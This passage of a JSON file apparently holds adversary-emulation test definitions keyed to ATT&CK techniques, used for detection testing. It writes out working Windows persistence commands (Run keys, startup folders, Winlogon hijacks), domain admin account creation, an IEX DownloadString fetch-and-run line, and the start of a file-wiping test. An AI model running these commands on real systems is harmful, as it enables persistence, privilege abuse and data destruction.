				"get_prereq_command": "New-Item -Type Directory (split-path \"#{input_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1059.003/src/t1059.003_cmd.cmd\" -OutFile \"#{input_file}\"\n"
			}
		],
		"executor": {
			"command": "cmd /r cmd<\"#{input_file}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1059.003",
		"phases": ["execution"]
	},
	{
		"name": "Command prompt writing script to file then executes it",
		"auto_generated_guid": "00682c9f-7df4-4df8-950b-6dcaaa3ad9af",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"script_path": {
				"description": "Path in which the script will be written.",
				"type": "path",
				"default": "%TEMP%\\"
			},
			"script_name": {
				"description": "Script name (without the extension)",
				"type": "string",
				"default": "AtomicTest"
			}
		},
		"executor": {
			"command": " c:\\windows\\system32\\cmd.exe /c cd /d #{script_path} & echo Set objShell = CreateObject(\"WScript.Shell\"):Set objExec = objShell.Exec(\"whoami\"):Set objExec = Nothing:Set objShell = Nothing > #{script_name}.vbs & #{script_name}.vbs",
			"cleanup_command": "del \"#{script_name}.vbs\" >nul 2>&1",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1059.003",
		"phases": ["execution"]
	},
	{
		"name": "Reg Key Run",
		"auto_generated_guid": "e55be3fd-3521-4610-9d1a-e210e42dcf05",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"command_to_execute": {
				"description": "Thing to Run",
				"type": "path",
				"default": "C:\\Path\\AtomicRedTeam.exe"
			}
		},
		"executor": {
			"command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"#{command_to_execute}\"\n",
			"cleanup_command": "REG DELETE \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Reg Key RunOnce",
		"auto_generated_guid": "554cbd88-cde1-4b56-8168-0be552eed9eb",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"thing_to_execute": {
				"description": "Thing to Run",
				"type": "path",
				"default": "C:\\Path\\AtomicRedTeam.dll"
			}
		},
		"executor": {
			"command": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"#{thing_to_execute}\"\n",
			"cleanup_command": "REG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "PowerShell Registry RunOnce",
		"auto_generated_guid": "eb44f842-0457-4ddc-9b92-c4caa144ac42",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"thing_to_execute": {
				"description": "Thing to Run",
				"type": "path",
				"default": "powershell.exe"
			},
			"reg_key_path": {
				"description": "Path to registry key to update",
				"type": "path",
				"default": "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
			}
		},
		"executor": {
			"command": "$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\")\"'\n",
			"cleanup_command": "Remove-ItemProperty -Path #{reg_key_path} -Name \"NextRun\" -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Suspicious vbs file run from startup Folder",
		"auto_generated_guid": "2cb98256-625e-4da9-9d44-f2e5f90b8bd5",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n",
			"cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Suspicious jse file run from startup Folder",
		"auto_generated_guid": "dade9447-791e-4c8f-b04b-3a35855dfa06",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\ncscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\ncscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\n",
			"cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Suspicious bat file run from startup Folder",
		"auto_generated_guid": "5b6768e4-44d2-44f0-89da-a01d1430fd5e",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\n",
			"cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Add Executable Shortcut Link to User Startup Folder",
		"auto_generated_guid": "24e55612-85f6-4bd6-ae74-a73d02e3441d",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$Target = \"C:\\Windows\\System32\\calc.exe\"\n$ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\"\n$WScriptShell = New-Object -ComObject WScript.Shell\n$Create = $WScriptShell.CreateShortcut($ShortcutLocation)\n$Create.TargetPath = $Target\n$Create.Save()      ",
			"cleanup_command": "Remove-Item \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\" -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Add persistance via Recycle bin",
		"auto_generated_guid": "bda6a3d6-7aa7-4e89-908b-306772e9662f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"calc.exe\" /f",
			"cleanup_command": "reg DELETE \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\" /f",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "SystemBC Malware-as-a-Service Registry",
		"auto_generated_guid": "9dc7767b-30c1-4cc4-b999-50cab5e27891",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"reg_key_value": {
				"description": "Thing to Run",
				"type": "path",
				"default": "powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File"
			},
			"reg_key_path": {
				"description": "Path to registry key to update",
				"type": "path",
				"default": "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
			}
		},
		"executor": {
			"command": "$RunKey = \"#{reg_key_path}\"\nSet-ItemProperty -Path $RunKey -Name \"socks5_powershell\" -Value \"#{reg_key_value}\"\n",
			"cleanup_command": "Remove-ItemProperty -Path #{reg_key_path} -Name \"socks5_powershell\" -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value",
		"auto_generated_guid": "acfef903-7662-447e-a391-9c91c2f00f7b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"new_startup_folder": {
				"description": "new startup folder to replace standard one",
				"type": "string",
				"default": "$env:TMP\\atomictest\\"
			},
			"payload": {
				"description": "executable to be placed in new startup location ",
				"type": "string",
				"default": "C:\\Windows\\System32\\calc.exe"
			}
		},
		"executor": {
			"command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"\nCopy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"\nSet-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"#{new_startup_folder}\"\n",
			"cleanup_command": "Set-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nRemove-Item \"#{new_startup_folder}\" -Recurse -Force\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Change Startup Folder - HKCU Modify User Shell Folders Startup Value",
		"auto_generated_guid": "8834b65a-f808-4ece-ad7e-2acdf647aafa",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"new_startup_folder": {
				"description": "new startup folder to replace standard one",
				"type": "string",
				"default": "$env:TMP\\atomictest\\"
			},
			"payload": {
				"description": "executable to be placed in new startup location ",
				"type": "string",
				"default": "C:\\Windows\\System32\\calc.exe"
			}
		},
		"executor": {
			"command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"\nCopy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"\nSet-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"#{new_startup_folder}\"\n",
			"cleanup_command": "Set-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nRemove-Item \"#{new_startup_folder}\" -Recurse -Force\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "HKCU - Policy Settings Explorer Run Key",
		"auto_generated_guid": "a70faea1-e206-4f6f-8d9a-67379be8f6f1",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"target_key_value_name": {
				"description": "registry value to crate on target key",
				"type": "string",
				"default": "atomictest"
			},
			"payload": {
				"description": "payload to execute",
				"type": "string",
				"default": "C:\\Windows\\System32\\calc.exe"
			}
		},
		"executor": {
			"command": "if (!(Test-Path -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){\n  New-Item -ItemType Key -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\n}\nSet-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\"\n",
			"cleanup_command": "Remove-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\"",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "HKLM - Policy Settings Explorer Run Key",
		"auto_generated_guid": "b5c9a9bc-dda3-4ea0-b16a-add8e81ab75f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"target_key_value_name": {
				"description": "registry value to crate on target key",
				"type": "string",
				"default": "atomictest"
			},
			"payload": {
				"description": "payload to execute",
				"type": "string",
				"default": "C:\\Windows\\System32\\calc.exe"
			}
		},
		"executor": {
			"command": "if (!(Test-Path -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){\n  New-Item -ItemType Key -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\n}\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\"\n",
			"cleanup_command": "Remove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\"",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "HKLM - Append Command to Winlogon Userinit KEY Value",
		"auto_generated_guid": "f7fab6cc-8ece-4ca7-a0f1-30a22fccd374",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"payload": {
				"description": "what to run",
				"type": "string",
				"default": "C:\\Windows\\System32\\calc.exe"
			}
		},
		"executor": {
			"command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \" #{payload}\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$newvalue\"\n",
			"cleanup_command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup');\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup'",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "HKLM - Modify default System Shell - Winlogon Shell KEY Value ",
		"auto_generated_guid": "1d958c61-09c6-4d9e-b26b-4130314e520e",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"payload": {
				"description": "what to run",
				"type": "string",
				"default": "C:\\Windows\\explorer.exe"
			}
		},
		"executor": {
			"command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \", #{payload}\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$newvalue\"\n",
			"cleanup_command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Shell-backup');\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Shell-backup'",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "secedit used to create a Run key in the HKLM Hive",
		"auto_generated_guid": "14fdc3f1-6fc3-4556-8d36-aa89d9d42d02",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"ini_file": {
				"description": "INI config template",
				"type": "string",
				"default": "$PathToAtomicsFolder\\T1547.001\\src\\regtemplate.ini"
			},
			"secedit_db": {
				"description": "Custom secedit db",
				"type": "string",
				"default": "mytemplate.db"
			}
		},
		"executor": {
			"command": "secedit /import /db #{secedit_db} /cfg \"#{ini_file}\"\nsecedit /configure /db #{secedit_db}\n",
			"cleanup_command": "REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"calc\" /f >nul 2>&1",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Modify BootExecute Value",
		"auto_generated_guid": "befc2b40-d487-4a5a-8813-c11085fb5672",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"registry_value": {
				"description": "Registry value to set",
				"type": "string",
				"default": "autocheck autoche *"
			}
		},
		"executor": {
			"command": "if (!(Test-Path \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\")) { reg.exe export \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\" /y }\nSet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" -Name \"BootExecute\" -Value \"#{registry_value}\" -Type MultiString\n",
			"cleanup_command": "reg.exe import \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\"\nRemove-Item -Path \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\" -Force\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Allowing custom application to execute during new RDP logon session",
		"auto_generated_guid": "b051b3c0-66e7-4a81-916d-e6383bd3a669",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"malicious_app": {
				"description": "Application to be executed during successful RDP session",
				"type": "string",
				"default": "calc"
			}
		},
		"executor": {
			"command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\" /v StartupPrograms /t REG_SZ /d \"#{malicious_app}\"\n",
			"cleanup_command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\" /v StartupPrograms /t REG_SZ /d \"rdpclip\"",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Creating Boot Verification Program Key for application execution during successful boot",
		"auto_generated_guid": "6e1666d5-3f2b-4b9a-80aa-f011322380d4",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"malicious_file": {
				"description": "Application to be executed during successful boot",
				"type": "string",
				"default": "C:\\Program Files\\Internet Explorer\\iexplore.exe"
			}
		},
		"executor": {
			"command": "reg add HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram /v ImagePath /t REG_SZ /d \"#{malicious_file}\"\n",
			"cleanup_command": "reg delete HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1547.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Create a new Windows domain admin user",
		"auto_generated_guid": "fcec2963-9951-4173-9bfa-98d8b7834e62",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"username": {
				"description": "Username of the user to create",
				"type": "string",
				"default": "T1136.002_Admin"
			},
			"password": {
				"description": "Password of the user to create",
				"type": "string",
				"default": "T1136_pass123!"
			},
			"group": {
				"description": "Domain administrator group to which add the user to",
				"type": "string",
				"default": "Domain Admins"
			}
		},
		"executor": {
			"command": "net user \"#{username}\" \"#{password}\" /add /domain\nnet group \"#{group}\" \"#{username}\" /add /domain\n",
			"cleanup_command": "net user \"#{username}\" >nul 2>&1 /del /domain\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1136.002",
		"phases": ["persistence"]
	},
	{
		"name": "Create a new account similar to ANONYMOUS LOGON",
		"auto_generated_guid": "dc7726d2-8ccb-4cc6-af22-0d5afb53a548",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"username": {
				"description": "Username of the user to create",
				"type": "string",
				"default": "ANONYMOUS  LOGON"
			},
			"password": {
				"description": "Password of the user to create",
				"type": "string",
				"default": "T1136_pass123!"
			}
		},
		"executor": {
			"command": "net user \"#{username}\" \"#{password}\" /add /domain\n",
			"cleanup_command": "net user \"#{username}\" >nul 2>&1 /del /domain\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1136.002",
		"phases": ["persistence"]
	},
	{
		"name": "Create a new Domain Account using PowerShell",
		"auto_generated_guid": "5a3497a4-1568-4663-b12a-d4a5ed70c7d7",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"username": {
				"description": "Name of the Account to be created",
				"type": "string",
				"default": "T1136.002_Admin"
			},
			"password": {
				"description": "Password of the Account to be created",
				"type": "string",
				"default": "T1136_pass123!"
			}
		},
		"executor": {
			"command": "$SamAccountName = '#{username}'\n$AccountPassword = ConvertTo-SecureString '#{password}' -AsPlainText -Force\nAdd-Type -AssemblyName System.DirectoryServices.AccountManagement\n$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)\n$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)\n$User.SamAccountName = $SamAccountName\n$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)\n$User.SetPassword($TempCred.GetNetworkCredential().Password)\n$User.Enabled = $True\n$User.PasswordNotRequired = $False\n$User.DisplayName = $SamAccountName\n$User.Save()\n$User\n",
			"cleanup_command": "cmd /c \"net user #{username} /del >nul 2>&1\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1136.002",
		"phases": ["persistence"]
	},
	{
		"name": "Active Directory Create Admin Account",
		"auto_generated_guid": "562aa072-524e-459a-ba2b-91f1afccf5ab",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"domain": {
				"description": "The domain to be tested",
				"type": "string",
				"default": "example"
			},
			"top_level_domain": {
				"description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)",
				"type": "string",
				"default": "test"
			},
			"admin_user": {
				"description": "username@domain of a user with admin privileges",
				"type": "string",
				"default": "admin@example.test"
			},
			"admin_password": {
				"description": "password of the user with admin privileges referenced in admin_user",
				"type": "string",
				"default": "s3CurePssw0rD!"
			},
			"domain_controller": {
				"description": "Name of the domain_controller machine, defined in etc/hosts",
				"type": "string",
				"default": "adVM"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available\n",
				"prereq_command": "which ldapadd && which ldapmodify\n",
				"get_prereq_command": "echo ldapadd or ldapmodify not found; exit 1\n"
			}
		],
		"executor": {
			"elevation_required": false,
			"command": "echo \"dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\\nchangetype: add\\nobjectClass: top\\nobjectClass: person\\nobjectClass: organizationalPerson\\nobjectClass: user\\ncn: Admin User\\nsn: User\\ngivenName: Atomic User\\nuserPrincipalName: adminuser@#{domain}.#{top_level_domain}\\nsAMAccountName: adminuser\\nuserAccountControl: 512\\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}\" > tempadmin.ldif\necho ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\nldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\n",
			"cleanup_command": "echo removing Atomic User (temporary user)\necho \"dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\\nchangetype: delete\" > deleteuser.ldif\nldapmodify -H ldap://#{domain_controller}:389 -x -D #{admin_user} -w #{admin_password} -f deleteuser.ldif\nrm deleteuser.ldif\nrm tempadmin.ldif\n",
			"name": "sh"
		},
		"attack_technique": "T1136.002",
		"phases": ["persistence"]
	},
	{
		"name": "Active Directory Create User Account (Non-elevated)",
		"auto_generated_guid": "8c992cb3-a46e-4fd5-b005-b1bab185af31",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"domain": {
				"description": "The domain to be tested",
				"type": "string",
				"default": "example"
			},
			"top_level_domain": {
				"description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)",
				"type": "string",
				"default": "test"
			},
			"admin_user": {
				"description": "username@domain of a user with admin privileges",
				"type": "string",
				"default": "user@example.test"
			},
			"admin_password": {
				"description": "password of the user",
				"type": "string",
				"default": "s3CurePssw0rD!"
			},
			"domain_controller": {
				"description": "Name of the domain_controller machine, defined in etc/hosts",
				"type": "string",
				"default": "adVM"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapadd, ldapmodify\n",
				"prereq_command": "which ldapadd\nwhich ldapmodify\n",
				"get_prereq_command": "echo ldapadd or ldapmodify not found; exit 1\n"
			}
		],
		"executor": {
			"elevation_required": false,
			"command": "echo \"dn: cn=Atomic User, cn=Users,dc=#{domain},dc=#{top_level_domain}\\nobjectClass: person\\ncn: Atomic User\\nsn: User\" > tempadmin.ldif\necho ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\nldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\n",
			"cleanup_command": "echo removing Atomic User (temporary user)\necho \"dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\\nchangetype: delete\" > deleteuser.ldif\nldapmodify -H ldap://#{domain_controller}:389 -x -D #{admin_user} -w #{admin_password} -f deleteuser.ldif\nrm deleteuser.ldif\nrm tempadmin.ldif\n",
			"name": "sh"
		},
		"attack_technique": "T1136.002",
		"phases": ["persistence"]
	},
	{
		"name": "Windows - Overwrite file with SysInternals SDelete",
		"auto_generated_guid": "476419b5-aebf-4366-a131-ae3e8dae5fc2",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"sdelete_exe": {
				"description": "Path of sdelete executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\Sdelete\\sdelete.exe"
			},
			"file_to_delete": {
				"description": "Path of file to delete",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1485.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Secure delete tool from SysInternals must exist on disk at specified location (#{sdelete_exe})\n",
				"prereq_command": "if (Test-Path \"#{sdelete_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/SDelete.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\SDelete.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\SDelete.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sdelete\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\SDelete.zip\" -Force\n"
			}
		],
		"executor": {
